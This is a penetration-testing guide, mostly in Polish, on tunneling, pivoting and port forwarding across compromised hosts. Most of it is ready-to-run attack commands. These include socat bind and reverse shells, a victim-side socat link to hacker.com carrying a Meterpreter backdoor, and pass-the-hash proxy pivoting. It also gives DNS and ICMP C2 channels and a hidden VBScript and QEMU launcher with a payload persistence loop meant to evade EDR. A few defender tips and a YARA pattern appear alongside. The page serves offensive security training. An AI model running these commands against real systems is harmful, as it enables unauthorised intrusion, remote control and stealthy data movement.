# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap wskazówka

> [!WARNING]
> **ICMP** i **SYN** scans nie mogą być tunelowane przez socks proxies, więc musimy **wyłączyć wykrywanie pingów** (`-Pn`) i określić **skany TCP** (`-sT`), aby to zadziałało.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH połączenie graficzne (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Otwórz nowy Port w SSH Server --> Inny port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Lokalny port --> Skompromitowany host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Lokalny port --> Skompromitowany host (SSH) --> Gdziekolwiek
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Jest to przydatne do uzyskania reverse shells z wewnętrznych hostów przez DMZ do twojego hosta:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Musisz mieć **root** na obu urządzeniach (ponieważ będziesz tworzyć nowe interfejsy) i konfiguracja sshd musi pozwalać na logowanie jako root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Włącz forwarding po stronie serwera
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Ustaw nową trasę po stronie klienta
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> Atak downgrade Terrapin z 2023 roku może pozwolić man-in-the-middle na manipulację wczesnym SSH handshake i wstrzyknięcie danych do **dowolnego przekazywanego kanału** (`-L`, `-R`, `-D`). Upewnij się, że zarówno klient, jak i serwer są załatane (**OpenSSH ≥ 9.6/LibreSSH 6.7**) lub jawnie wyłącz podatne algorytmy `chacha20-poly1305@openssh.com` i `*-etm@openssh.com` w `sshd_config`/`ssh_config` zanim polegasz na tunelach SSH.

## SSHUTTLE

Możesz **tunnel** via **ssh** cały **traffic** do **subnetwork** przez host.\ Na przykład, przekierowując cały **traffic** kierowany do 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Połącz się za pomocą klucza prywatnego
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Lokalny port --> Skompromitowany host (aktywna sesja) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Inny sposób:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Otwórz port w teamserver, nasłuchujący na wszystkich interfejsach, który można użyć do **kierowania ruchu przez beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> W tym przypadku **port is opened in the beacon host**, a nie w Team Server; ruch jest wysyłany do Team Server, a następnie stamtąd do wskazanego host:port
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Warto zauważyć:

- Beacon's reverse port forward został zaprojektowany do **tunelowania ruchu do Team Server, a nie do przekazywania między poszczególnymi maszynami**.
- Ruch jest **tunelowany w ramach Beacon's C2 traffic**, w tym P2P links.
- **Admin privileges are not required** do tworzenia reverse port forwards na wysokich portach.

### rPort2Port local

> [!WARNING]
> W tym przypadku **port jest otwierany w beacon host**, nie w Team Server i **ruch jest wysyłany do Cobalt Strike client** (nie do Team Server) i stamtąd do wskazanego host:port
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Musisz przesłać plik webowy jako tunel: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Możesz pobrać go ze strony releases projektu: [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Musisz użyć **tej samej wersji dla klienta i serwera**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Użyj tej samej wersji dla agent i proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Powiązywanie i nasłuchiwanie agenta
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Dostęp do lokalnych portów agenta
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. Tunel jest nawiązywany z maszyny ofiary.\
Tworzony jest proxy socks4 na 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot przez **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port przez socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter przez SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Możesz obejść **non-authenticated proxy**, wykonując tę linię zamiast ostatniej w konsoli ofiary:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Utwórz certyfikaty po obu stronach: Client i Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Połącz lokalny port SSH (22) z portem 443 hosta atakującego
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

To jest konsolowa wersja PuTTY (opcje są bardzo podobne do ssh client).

Ponieważ ten binary zostanie uruchomiony na victim i jest ssh clientem, musimy otworzyć naszą ssh service i port, aby uzyskać reverse connection. Następnie, aby przekierować tylko lokalnie dostępny port na port w naszej maszynie:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Musisz być local adminem (dla dowolnego portu)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Musisz mieć **dostęp RDP do systemu**.\
Pobierz:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - To narzędzie używa `Dynamic Virtual Channels` (`DVC`) z funkcji Remote Desktop Service w Windows. DVC odpowiada za **tunelowanie pakietów przez połączenie RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Na komputerze klienckim załaduj **`SocksOverRDP-Plugin.dll`** w ten sposób:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Teraz możemy **połączyć się** z **ofiarą** przez **RDP** używając **`mstsc.exe`**, i powinniśmy otrzymać **komunikat** mówiący, że **wtyczka SocksOverRDP jest włączona**, i będzie **nasłuchiwać** na **127.0.0.1:1080**.

**Połącz się** przez **RDP** i prześlij oraz uruchom na maszynie ofiary binarkę `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Teraz potwierdź na swojej maszynie (attacker), że port 1080 nasłuchuje:
```
netstat -antb | findstr 1080
```
Teraz możesz użyć [**Proxifier**](https://www.proxifier.com/) **do przekierowania ruchu przez ten port.**

## Proxify Windows GUI Apps

Możesz sprawić, że aplikacje GUI w Windows będą korzystać z proxy przy użyciu [**Proxifier**](https://www.proxifier.com/).\
W **Profile -> Proxy Servers** dodaj IP i port serwera SOCKS.\
W **Profile -> Proxification Rules** dodaj nazwę programu do proxify oraz połączenia do adresów IP, które chcesz proxify.

## NTLM proxy bypass

Wspomniane wcześniej narzędzie: **Rpivot**\
**OpenVPN** może również go ominąć, ustawiając te opcje w pliku konfiguracyjnym:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Uwierzytelnia się względem proxy i wiąże lokalny port, który jest przekierowywany do wskazanej przez Ciebie zewnętrznej usługi. Następnie możesz korzystać z wybranego przez siebie narzędzia przez ten port.\
Na przykład przekierowuje port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Now, if you set for example in the victim the **SSH** service to listen in port 443. You can connect to it through the attacker port 2222.\
You could also use a **meterpreter** that connects to localhost:443 and the attacker is listening in port 2222.

## YARP

Reverse proxy stworzony przez Microsoft. Możesz go znaleźć tutaj: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root jest wymagany w obu systemach, aby utworzyć tun adapters i tunelować dane między nimi przy użyciu zapytań DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Ten tunnel będzie bardzo wolny. Możesz utworzyć skompresowane połączenie SSH przez ten tunnel, używając:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

Ustanawia kanał C\&C przez DNS. Nie wymaga uprawnień roota.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **W PowerShell**

Możesz użyć [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) aby uruchomić klienta dnscat2 w PowerShell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Przekierowywanie portów za pomocą dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Zmień DNS proxychains

Proxychains przechwytuje wywołanie libc `gethostbyname` i tuneluje żądanie DNS przez socks proxy przy użyciu TCP. By **default** serwer **DNS** używany przez proxychains to **4.2.2.2** (zakodowany na stałe). Aby to zmienić, edytuj plik: _/usr/lib/proxychains3/proxyresolv_ i zmień adres IP. Jeśli jesteś w **Windows environment** możesz ustawić IP **domain controller**.

## Tunelowanie w Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

The Storm-2603 actor created a **dual-channel C2 ("AK47C2")** that abuses *only* outbound **DNS** and **plain HTTP POST** traffic – two protocols that are rarely blocked on corporate networks.

1. **DNS mode (AK47DNS)**
• Generuje losowy 5-znakowy SessionID (np. `H4T14`).
• Dodaje przedrostek `1` dla *task requests* albo `2` dla *results* i łączy różne pola (flagi, SessionID, nazwa komputera).
• Każde pole jest **szyfrowane XOR kluczem ASCII `VHBD@H`**, zakodowane w hex i połączone kropkami – na końcu znajduje się domena kontrolowana przez atakującego:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Żądania używają `DnsQuery()` dla rekordów **TXT** (i zapasowo **MG**).
• Gdy odpowiedź przekracza 0xFF bajtów, backdoor **fragmentuje** dane na kawałki po 63 bajty i wstawia markery:
`s<SessionID>t<TOTAL>p<POS>` tak aby serwer C2 mógł je poskładać w odpowiedniej kolejności.

2. **HTTP mode (AK47HTTP)**
• Tworzy opakowanie JSON:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Cały blob jest XOR-`VHBD@H` → hex → wysyłany jako ciało **`POST /`** z nagłówkiem `Content-Type: text/plain`.
• Odpowiedź używa tego samego kodowania, a pole `cmd` jest wykonywane przy użyciu `cmd.exe /c <command> 2>&1`.

Blue Team notes
• Szukaj nietypowych **TXT queries**, których pierwszy label jest długim hexem i zawsze kończy się jedną rzadką domeną.
• Stały klucz XOR, po którym następuje ASCII-hex, jest łatwy do wykrycia przy pomocy YARA: `6?56484244?484` (`VHBD@H` in hex).
• Dla HTTP, oznaczaj ciała POST z text/plain, które są czystym hexem i mają parzystą liczbę bajtów.

{{#note}}
Cały kanał mieści się w ramach **standardowych zapytań zgodnych z RFC** i utrzymuje każdą etykietę subdomeny poniżej 63 bajtów, co czyni go trudnym do wykrycia w większości logów DNS.
{{#endnote}}

## Tunelowanie ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

W obu systemach wymagane są uprawnienia root do tworzenia tun adapterów i tunelowania danych między nimi za pomocą ICMP echo requests.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Pobierz stąd**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **to narzędzie do wystawiania rozwiązań w Internecie jednym poleceniem.**\
_Adresy URI ekspozycji wyglądają tak:_ **UID.ngrok.io**

### Instalacja

- Załóż konto: https://ngrok.com/signup
- Pobranie klienta:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Podstawowe użycie

**Dokumentacja:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Możliwe jest również dodanie authentication i TLS, jeśli to konieczne._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Udostępnianie plików przez HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_Przydatne do XSS,SSRF,SSTI ..._\
Bezpośrednio ze stdout lub w interfejsie HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling wewnętrznego serwisu HTTP
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml prosty przykład konfiguracji

Otwiera 3 tunele:

- 2 TCP
- 1 HTTP serwujący pliki statyczne z /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare’s `cloudflared` daemon może tworzyć outbound tunnels, które eksponują **local TCP/UDP services** bez potrzeby stosowania inbound firewall rules, używając Cloudflare’s edge jako rendez-vous point. Jest to bardzo przydatne, gdy egress firewall zezwala tylko na ruch HTTPS, a inbound connections są zablokowane.

### Szybki one-liner tunelu
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Trwałe tunelowanie przez DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Uruchom konektor:
```bash
cloudflared tunnel run mytunnel
```
Ponieważ cały ruch opuszcza hosta **ruch wychodzący na porcie 443**, Cloudflared tunnels są prostym sposobem na obejście ingress ACLs lub granic NAT. Należy pamiętać, że plik binarny zazwyczaj działa z podwyższonymi uprawnieniami – używaj kontenerów lub flagi `--user`, gdy to możliwe.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) to aktywnie utrzymywany reverse-proxy napisany w Go, który obsługuje **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**. Począwszy od **v0.53.0 (May 2024)** może działać jako **SSH Tunnel Gateway**, więc host docelowy może uruchomić reverse tunnel używając jedynie standardowego klienta OpenSSH – nie jest wymagany dodatkowy plik binarny.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Korzystanie z nowej bramy SSH (bez frpc binary)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Powyższe polecenie publikuje port ofiary **8080** jako **attacker_ip:9000** bez wdrażania żadnych dodatkowych narzędzi — idealne do living-off-the-land pivoting.

## Ukryte tunele oparte na VM z QEMU

QEMU’s user-mode networking (`-netdev user`) supports an option called `hostfwd` that **binds a TCP/UDP port on the *host* and forwards it into the *guest***.  When the guest runs a full SSH daemon, the hostfwd rule gives you a disposable SSH jump box that lives entirely inside an ephemeral VM – perfect for hiding C2 traffic from EDR because all malicious activity and files stay in the virtual disk.

### Szybki one-liner
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Powyższe polecenie uruchamia obraz **Tiny Core Linux** (`tc.qcow2`) w pamięci RAM.  
• Port **2222/tcp** na hoście Windows jest transparentnie przekierowywany do **22/tcp** wewnątrz gościa.  
• Z punktu widzenia atakującego target po prostu wystawia port 2222; wszelkie pakiety, które do niego dotrą, są obsługiwane przez serwer SSH działający w VM.

### Uruchamianie w ukryciu przez VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Uruchomienie skryptu przy użyciu `cscript.exe //B update.vbs` utrzymuje okno ukryte.

### Trwałość w systemie gościa

Ponieważ Tiny Core jest bezstanowy, napastnicy zazwyczaj:

1. Upuszczają payload do `/opt/123.out`
2. Dodają do `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Dodają `home/tc` i `opt` do `/opt/filetool.lst` tak, że payload jest spakowany do `mydata.tgz` przy zamknięciu.

### Dlaczego to omija wykrywanie

• Only two unsigned executables (`qemu-system-*.exe`) touch disk; no drivers or services are installed.  
• Security products on the host see **benign loopback traffic** (the actual C2 terminates inside the VM).  
• Memory scanners never analyse the malicious process space because it lives in a different OS.

### Wskazówki dla obrońców

• Generuj alert dla **unexpected QEMU/VirtualBox/KVM binaries** w ścieżkach zapisywalnych przez użytkownika.  
• Blokuj połączenia wychodzące, które pochodzą od `qemu-system*.exe`.  
• Wyszukuj rzadkie porty nasłuchu (2222, 10022, …), które pojawiają się bezpośrednio po uruchomieniu QEMU.

---

## Inne narzędzia do sprawdzenia

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## Źródła

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
